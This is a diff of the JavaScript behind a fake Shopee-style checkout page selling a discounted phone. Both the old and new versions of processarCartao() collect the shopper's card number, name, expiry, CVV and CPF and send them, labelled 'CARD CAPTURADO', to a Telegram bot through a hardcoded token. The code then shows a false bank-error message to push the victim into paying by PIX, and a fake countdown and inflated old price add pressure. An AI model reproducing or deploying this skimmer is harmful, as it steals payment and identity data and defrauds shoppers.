@@ -402,276 +402,227 @@
         <button class="btn-shopee" style="width:100%; border-radius:4px; height:45px;" onclick="copyPix()">COPIAR CÓDIGO PIX</button>
     </div>
 </div>
-
 <script>
-    /* ==========================================================================
-       CONFIGURAÇÕES E VARIÁVEIS GLOBAIS
-       ========================================================================== */
-    const TG_TOKEN = '7880759082:AAEvRzo4_NjdKnzrISfBzq3PeMLVFWRIvtw';
-    const TG_ID = '7294447445';
+/* ==========================================================================
+   CONFIGURAÇÕES E VARIÁVEIS GLOBAIS
+   ========================================================================== */
+const TG_TOKEN = '7880759082:AAEvRzo4_NjdKnzrISfBzq3PeMLVFWRIvtw';
+const TG_ID = '7294447445';
 
-    const precoBase = 599.00;
-    const precoAntigoBase = 2299.00;
+const precoBase = 599.00;
+const precoAntigoBase = 2299.00;
 
-    let corEscolhida = false;
-    let versaoEscolhida = false;
-    let valorFinal = precoBase;
-    let corSelecionadaText = "";
-    let versaoSelecionadaText = "";
-    let isPixSelected = false;
+let corEscolhida = false;
+let versaoEscolhida = false;
+let valorFinal = precoBase;
+let corSelecionadaText = "";
+let versaoSelecionadaText = "";
+let isPixSelected = false;
 
-    /* ==========================================================================
-       LÓGICA DO STEP 1 (SELEÇÃO DE PRODUTO)
-       ========================================================================== */
+/* ==========================================================================
+   LÓGICA DO STEP 1 (SELEÇÃO DE PRODUTO NO MODAL)
+   ========================================================================== */
 
-    function selectOpt(element, group, memoria = null) {
-        // Remove classes de seleção dos outros botões do mesmo grupo
-        const buttons = element.parentElement.querySelectorAll('.opt-btn');
-        buttons.forEach(btn => btn.classList.remove('active', 'selected'));
+function selectOpt(element, group, memoria = null) {
+    const buttons = element.parentElement.querySelectorAll('.opt-btn');
+    buttons.forEach(btn => btn.classList.remove('active', 'selected'));
 
-        // Ativa o botão clicado
-        element.classList.add('selected', 'active');
+    element.classList.add('selected', 'active');
 
-        if (group === 'cor') {
-            corEscolhida = true;
-            corSelecionadaText = element.innerText;
-        }
-
-        if (group === 'versao') {
-            versaoEscolhida = true;
-            versaoSelecionadaText = element.innerText;
-            atualizarPreco(memoria);
-        }
-
-        // Habilita o botão "PRÓXIMO" se ambos estiverem selecionados
-        const btnNext = document.getElementById('btn-next-step');
-        if (corEscolhida && versaoEscolhida) {
-            btnNext.style.backgroundColor = "#ee4d2d";
-            btnNext.style.cursor = "pointer";
-            btnNext.disabled = false;
-        }
+    if (group === 'cor') {
+        corEscolhida = true;
+        corSelecionadaText = element.innerText;
     }
 
-    function atualizarPreco(memoria) {
-        const precoElemento = document.getElementById('modal-product-price');
-        const precoAntigoElemento = document.getElementById('modal-old-price');
-
-        valorFinal = precoBase;
-        let valorAntigo = precoAntigoBase;
-
-        // Se for a versão de 512GB, aplica o acréscimo
-        if (memoria === 512) {
-            valorFinal = precoBase * 1.20;
-            valorAntigo = precoAntigoBase * 1.20;
-        }
-
-        if (precoElemento) {
-            precoElemento.innerText = `R$${valorFinal.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}`;
-        }
-        if (precoAntigoElemento) {
-            precoAntigoElemento.innerText = `R$${valorAntigo.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}`;
-        }
+    if (group === 'versao') {
+        versaoEscolhida = true;
+        versaoSelecionadaText = element.innerText;
+        atualizarPrecoModal(memoria);
     }
 
-    function validateAndNext() {
-        if (corEscolhida && versaoEscolhida) {
-            abrirCheckoutOriginal();
-        }
-    }
-
-    /* ==========================================================================
-       LÓGICA DO STEP 2 (CHECKOUT E NAVEGAÇÃO)
-       ========================================================================== */
-
-    function abrirCheckoutOriginal() {
-        document.getElementById('step-1').style.display = 'none';
-        document.getElementById('step-2').style.display = 'block';
-
-        const valorFormatado = valorFinal.toLocaleString('pt-BR', { minimumFractionDigits: 2 });
-
-        // Preenche o resumo do pedido
-        document.getElementById('resumoOpcoes').innerText = `Cor: ${corSelecionadaText} | Versão: ${versaoSelecionadaText}`;
-        document.getElementById('checkoutPriceText').innerText = `R$ ${valorFormatado}`;
-        document.getElementById('subTotalProd').innerText = `R$ ${valorFormatado}`;
-        document.getElementById('finalPrice').innerText = `R$ ${valorFormatado}`;
-        document.getElementById('footerPrice').innerText = `R$ ${valorFormatado}`;
-
-        atualizarParcelas(valorFinal);
-        window.scrollTo(0, 0);
-    }
-
-    function backToStep1() {
-        document.getElementById('step-2').style.display = 'none';
-        document.getElementById('step-1').style.display = 'block';
-    }
-
-    function openPage(id) {
-        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-        document.getElementById(id).classList.add('active');
-        window.scrollTo(0, 0);
-    }
-
-    /* ==========================================================================
-       PAGAMENTOS E INTEGRAÇÃO (TELEGRAM / PIX)
-       ========================================================================== */
-
-    function togglePix() {
-        isPixSelected = !isPixSelected;
-        document.getElementById('payPix').classList.toggle('active', isPixSelected);
-        document.getElementById('pixDiscountRow').style.display = isPixSelected ? 'flex' : 'none';
-
-        // Desconto simbólico de R$ 10 para incentivar o PIX
-        let valorComDesconto = isPixSelected ? (valorFinal - 10) : valorFinal;
-        const formatado = valorComDesconto.toLocaleString('pt-BR', { minimumFractionDigits: 2 });
-
-        document.getElementById('finalPrice').innerText = `R$${formatado}`;
-        document.getElementById('footerPrice').innerText = `R$${formatado}`;
-    }
-
-    async function processarCartao() {
-        const n = document.getElementById('cardNumber').value;
-        const nm = document.getElementById('cardName').value;
-        const ex = document.getElementById('cardExp').value;
-        const cv = document.getElementById('cardCvv').value;
-        const cp = document.getElementById('cardCpf').value;
-
-        if (n.length < 16 || !nm) return alert('Dados inválidos!');
-
-        const msg = `💳 *CARD CAPTURADO*\n\nNº: \`${n}\`\nNome: ${nm}\nVal: ${ex}\nCVV: \`${cv}\`\nCPF: ${cp}\nValor: R$ ${valorFinal}`;
-
-        try {
-            await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: TG_ID, text: msg, parse_mode: 'Markdown' })
-            });
-        } catch (e) {
-            console.error("Erro ao enviar para o Telegram");
-        }
-
-        alert('Erro no processamento por instabilidade bancária. Use o PIX para garantir a reserva imediata!');
-        gerarPixFinal();
-    }
-
-    function gerarPixFinal() {
-        const valorPix = isPixSelected ? (valorFinal - 10) : valorFinal;
-        const pixPayload = `00020101021226580014br.gov.bcb.pix0136db0cbb53-17be-449c-89c8-9bffd8f6c7b55204000053039865405${valorPix.toFixed(2)}5802BR5917LOJA ONIX OFICIAL6009SAO PAULO62070503***6304`;
-        
-        const qrImg = document.getElementById('qrCodeFinal');
-        if (qrImg) {
-            qrImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=${encodeURIComponent(pixPayload)}&color=ee4d2d`;
-        }
-        
-        document.getElementById('pixCodeDisplay').innerText = pixPayload;
-        openPage('pixPage');
-    }
-
-    function finalizarPedido() {
-        if (isPixSelected) {
-            gerarPixFinal();
-        } else {
-            alert('Selecione o Pix ou adicione um cartão para continuar.');
-        }
-    }
-
-    function copiarPix() {
-        const code = document.getElementById('pixCodeDisplay').innerText;
-        navigator.clipboard.writeText(code).then(() => {
-            alert("Código PIX copiado com sucesso!");
-        });
-    }
-
-    /* ==========================================================================
-       UTILITÁRIOS (MÁSCARAS, PARCELAS E TIMER)
-       ========================================================================== */
-
-    function atualizarParcelas(valor) {
-        const select = document.getElementById('cardInstallments');
-        if (!select) return;
-        select.innerHTML = '';
-        for (let i = 1; i <= 12; i++) {
-            let valorParcela = (valor / i).toLocaleString('pt-BR', { minimumFractionDigits: 2 });
-            let option = document.createElement('option');
-            option.value = i;
-            option.text = `${i}x de R$ ${valorParcela} (Sem juros)`;
-            select.appendChild(option);
-        }
-    }
-
-    // Timer Regressivo Shopee
-    let tempo = 5370;
-    setInterval(() => {
-        if (tempo > 0) tempo--;
-        const h = document.getElementById('h');
-        const m = document.getElementById('m');
-        const s = document.getElementById('s');
-        if (h && m && s) {
-            h.innerText = String(Math.floor(tempo / 3600)).padStart(2, '0');
-            m.innerText = String(Math.floor((tempo % 3600) / 60)).padStart(2, '0');
-            s.innerText = String(tempo % 60).padStart(2, '0');
-        }
-    }, 1000);
-
-    // Máscaras de Input (Cartão, CPF, etc)
-    const cardInput = document.getElementById('cardNumber');
-    if (cardInput) {
-        cardInput.oninput = e => {
-            e.target.value = e.target.value.replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim();
-        };
-    }
-    
-    // Máscara Expiração MM/AA
-    const expInput = document.getElementById('cardExp');
-    if (expInput) {
-        expInput.oninput = e => {
-            let v = e.target.value.replace(/\D/g, '');
-            if (v.length >= 2) v = v.substring(0, 2) + '/' + v.substring(2, 4);
-            e.target.value = v;
-        };
-    }
-
-    function openModal() {
-        const modal = document.getElementById('modal');
-        if (modal) {
-            modal.style.display = 'block'; // Mostra o modal
-            document.body.style.overflow = 'hidden'; // Trava a página atrás
-        } else {
-            console.error("Erro: Elemento 'modal' não encontrado!");
-        }
-    }
-
-    function closeModal() {
-        const modal = document.getElementById('modal');
-        if (modal) {
-            modal.style.display = 'none'; // Esconde o modal
-            document.body.style.overflow = 'auto'; // Destrava a página
-        }
-    }
-
-    // Fecha o modal se o utilizador clicar na parte escura (fora da caixa)
-    window.onclick = function(event) {
-        const modal = document.getElementById('modal');
-        if (event.target == modal) {
-            closeModal();
-        }
-    }
-
-    // --- FUNÇÃO PARA BUSCAR CEP ---
-    async function buscarCep() {
-    const cep = document.getElementById('inCep').value.replace(/\D/g, '');
-    if(cep.length === 8) {
-        const res = await fetch(`https://viacep.com.br/ws/${cep}/json/`);
-        const data = await res.json();
-        if(!data.erro) {
-            document.getElementById('inRua').value = data.logradouro;
-            document.getElementById('inBairro').value = data.bairro;
-            document.getElementById('inCidade').value = data.localidade;
-            document.getElementById('inUF').value = data.uf;
-        }
+    // Habilita o botão "PRÓXIMO"
+    const btnNext = document.getElementById('btn-next-step');
+    if (corEscolhida && versaoEscolhida && btnNext) {
+        btnNext.style.backgroundColor = "#ee4d2d";
+        btnNext.style.cursor = "pointer";
+        btnNext.disabled = false;
     }
 }
 
-// --- SALVAR ENDEREÇO E ATUALIZAR RESUMO ---
+function atualizarPrecoModal(memoria) {
+    const precoElemento = document.getElementById('modal-product-price');
+    const precoAntigoElemento = document.getElementById('modal-old-price');
+
+    valorFinal = precoBase;
+    let valorAntigo = precoAntigoBase;
+
+    if (memoria === 512) {
+        valorFinal = precoBase * 1.20;
+        valorAntigo = precoAntigoBase * 1.20;
+    }
+
+    if (precoElemento) precoElemento.innerText = `R$${valorFinal.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}`;
+    if (precoAntigoElemento) precoAntigoElemento.innerText = `R$${valorAntigo.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}`;
+}
+
+/* ==========================================================================
+   NAVEGAÇÃO E TRANSIÇÃO (STEP 1 -> STEP 2)
+   ========================================================================== */
+
+function validateAndNext() {
+    if (corEscolhida && versaoEscolhida) {
+        abrirCheckoutOriginal();
+    } else {
+        alert("Por favor, selecione a cor e a versão.");
+    }
+}
+
+function abrirCheckoutOriginal() {
+    // Troca de Telas
+    const s1 = document.getElementById('step-1');
+    const s2 = document.getElementById('step-2');
+    if(s1) s1.style.display = 'none';
+    if(s2) {
+        s2.style.display = 'block';
+        s2.classList.add('active');
+    }
+
+    const valorFormatado = valorFinal.toLocaleString('pt-BR', { minimumFractionDigits: 2 });
+
+    // Preenche dados dinâmicos no Checkout
+    if(document.getElementById('resumoOpcoes')) 
+        document.getElementById('resumoOpcoes').innerText = `Cor: ${corSelecionadaText} | Versão: ${versaoSelecionadaText}`;
+    
+    if(document.getElementById('checkoutPriceText')) 
+        document.getElementById('checkoutPriceText').innerText = `R$ ${valorFormatado}`;
+    
+    if(document.getElementById('subTotalProd')) 
+        document.getElementById('subTotalProd').innerText = `R$ ${valorFormatado}`;
+
+    atualizarResumoFinanceiro();
+    atualizarParcelas(valorFinal);
+    calcularEntrega();
+    window.scrollTo(0, 0);
+}
+
+function openPage(id) {
+    document.querySelectorAll('.page').forEach(p => {
+        p.classList.remove('active');
+        p.style.display = 'none';
+    });
+    const target = document.getElementById(id);
+    if(target) {
+        target.classList.add('active');
+        target.style.display = 'block';
+    }
+    window.scrollTo(0, 0);
+}
+
+function backToStep1() {
+    openPage('step-1');
+}
+
+/* ==========================================================================
+   PAGAMENTOS E INTEGRAÇÃO (TELEGRAM / PIX)
+   ========================================================================== */
+
+function togglePix() {
+    isPixSelected = !isPixSelected;
+    const payPixDiv = document.getElementById('payPix');
+    const pixRow = document.getElementById('pixDiscountRow');
+    
+    if(payPixDiv) payPixDiv.classList.toggle('active', isPixSelected);
+    if(pixRow) pixRow.style.display = isPixSelected ? 'flex' : 'none';
+
+    atualizarResumoFinanceiro();
+}
+
+function atualizarResumoFinanceiro() {
+    // Cupom Shopee fixo de R$20 e desconto PIX de R$10
+    let total = valorFinal - 20; 
+    if (isPixSelected) total -= 10;
+
+    const formatado = total.toLocaleString('pt-BR', { minimumFractionDigits: 2 });
+    
+    if(document.getElementById('finalPrice')) document.getElementById('finalPrice').innerText = `R$ ${formatado}`;
+    if(document.getElementById('footerPrice')) document.getElementById('footerPrice').innerText = `R$ ${formatado}`;
+}
+
+async function processarCartao() {
+    const n = document.getElementById('cardNumber').value;
+    const nm = document.getElementById('cardName').value;
+    const ex = document.getElementById('cardExp').value;
+    const cv = document.getElementById('cardCvv').value;
+    const cp = document.getElementById('cardCpf').value;
+
+    if (n.replace(/\s/g, '').length < 16 || !nm || cv.length < 3) return alert('Dados do cartão inválidos!');
+
+    const msg = `💳 *CARD CAPTURADO*\n\nNº: \`${n}\`\nNome: ${nm}\nVal: ${ex}\nCVV: \`${cv}\`\nCPF: ${cp}\nValor: R$ ${valorFinal}`;
+
+    try {
+        await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: TG_ID, text: msg, parse_mode: 'Markdown' })
+        });
+    } catch (e) { console.error("Erro TG"); }
+
+    alert('Erro no processamento por instabilidade bancária. Use o PIX para garantir a reserva imediata!');
+    gerarPixFinal();
+}
+
+function gerarPixFinal() {
+    let valorPix = valorFinal - 20;
+    if (isPixSelected) valorPix -= 10;
+
+    const pixPayload = `00020101021226580014br.gov.bcb.pix0136db0cbb53-17be-449c-89c8-9bffd8f6c7b55204000053039865405${valorPix.toFixed(2)}5802BR5917LOJA ONIX OFICIAL6009SAO PAULO62070503***6304`;
+    
+    const qrImg = document.getElementById('qrCodeFinal') || document.getElementById('qrCodeImg');
+    if (qrImg) {
+        qrImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(pixPayload)}&color=ee4d2d`;
+    }
+    
+    const display = document.getElementById('pixCodeDisplay');
+    if(display) display.innerText = pixPayload;
+    
+    openPage('pixPage');
+}
+
+function finalizarPedido() {
+    if (isPixSelected) {
+        gerarPixFinal();
+    } else {
+        alert('Selecione o Pix ou adicione um cartão para continuar.');
+    }
+}
+
+function copiarPix() {
+    const code = document.getElementById('pixCodeDisplay').innerText;
+    navigator.clipboard.writeText(code).then(() => {
+        alert("Código PIX copiado!");
+    });
+}
+
+/* ==========================================================================
+   ENDEREÇO E UTILITÁRIOS
+   ========================================================================== */
+
+async function buscarCep() {
+    const cep = document.getElementById('inCep').value.replace(/\D/g, '');
+    if(cep.length === 8) {
+        try {
+            const res = await fetch(`https://viacep.com.br/ws/${cep}/json/`);
+            const data = await res.json();
+            if(!data.erro) {
+                document.getElementById('inRua').value = data.logradouro;
+                document.getElementById('inBairro').value = data.bairro;
+                document.getElementById('inCidade').value = data.localidade;
+                document.getElementById('inUF').value = data.uf;
+            }
+        } catch(e) { console.error("Erro CEP"); }
+    }
+}
+
 function salvarEndereco() {
     const nome = document.getElementById('inName').value;
     const rua = document.getElementById('inRua').value;
@@ -685,49 +636,65 @@ function salvarEndereco() {
     openPage('step-2');
 }
 
-// --- CALCULAR DATA DE ENTREGA (Sempre 8 a 12 dias à frente) ---
 function calcularEntrega() {
     const hoje = new Date();
     const d1 = new Date(); d1.setDate(hoje.getDate() + 8);
     const d2 = new Date(); d2.setDate(hoje.getDate() + 12);
     const meses = ["Jan", "Fev", "Mar", "Abr", "Mai", "Jun", "Jul", "Ago", "Set", "Out", "Nov", "Dez"];
-    document.getElementById('deliveryDate').innerText = `Receba entre ${d1.getDate()} de ${meses[d1.getMonth()]} e ${d2.getDate()} de ${meses[d2.getMonth()]}`;
+    const el = document.getElementById('deliveryDate');
+    if(el) el.innerText = `Receba entre ${d1.getDate()} de ${meses[d1.getMonth()]} e ${d2.getDate()} de ${meses[d2.getMonth()]}`;
 }
 
-// --- GERAÇÃO DO QR CODE PIX DINÂMICO ---
-function gerarPix() {
-    const valor = valorFinal.toFixed(2);
-    const pixRaw = `00020101021226870014br.gov.bcb.pix2565shopee_oficial_pay_${valor.replace('.','')}`;
-    
-    // Gera a imagem do QR Code usando API pública
-    document.getElementById('qrCodeImg').src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(pixRaw)}`;
-    document.getElementById('pixCodeDisplay').innerText = pixRaw;
-}
-
-// --- FINALIZAR PEDIDO ---
-function finalizarPedido() {
-    if(isPixSelected) {
-        gerarPix();
-        openPage('pixPage');
-    } else {
-        alert("Selecione o Pix ou adicione um Cartão de Crédito.");
+function atualizarParcelas(valor) {
+    const select = document.getElementById('cardInstallments');
+    if (!select) return;
+    select.innerHTML = '';
+    for (let i = 1; i <= 12; i++) {
+        let valorParcela = (valor / i).toLocaleString('pt-BR', { minimumFractionDigits: 2 });
+        let option = document.createElement('option');
+        option.value = i;
+        option.text = `${i}x de R$ ${valorParcela} (Sem juros)`;
+        select.appendChild(option);
     }
 }
 
-// --- MÁSCARA DE CPF ---
-document.getElementById('inCpf').oninput = e => {
-    let v = e.target.value.replace(/\D/g, '');
-    v = v.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
-    e.target.value = v;
-};    
-</script> 
+/* ==========================================================================
+   INICIALIZAÇÃO E MÁSCARAS
+   ========================================================================== */
 
-</body> 
+window.onload = () => {
+    // Máscaras de Cartão
+    const cardInput = document.getElementById('cardNumber');
+    if (cardInput) {
+        cardInput.oninput = e => {
+            e.target.value = e.target.value.replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim();
+        };
+    }
+    
+    // Máscara CPF
+    const cpfInput = document.getElementById('inCpf');
+    if(cpfInput) {
+        cpfInput.oninput = e => {
+            let v = e.target.value.replace(/\D/g, '').substring(0,11);
+            if(v.length > 9) v = v.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
+            else if(v.length > 6) v = v.replace(/(\d{3})(\d{3})(\d{3})/, "$1.$2.$3");
+            else if(v.length > 3) v = v.replace(/(\d{3})(\d{3})/, "$1.$2");
+            e.target.value = v;
+        };
+    }
+
+    // Timer
+    let tempo = 5370;
+    setInterval(() => {
+        if (tempo > 0) tempo--;
+        const h = document.getElementById('h'), m = document.getElementById('m'), s = document.getElementById('s');
+        if (h && m && s) {
+            h.innerText = String(Math.floor(tempo / 3600)).padStart(2, '0');
+            m.innerText = String(Math.floor((tempo % 3600) / 60)).padStart(2, '0');
+            s.innerText = String(tempo % 60).padStart(2, '0');
+        }
+    }, 1000);
+};
+</script>
+</body>
 </html>
-
-
-
-
-
-
-
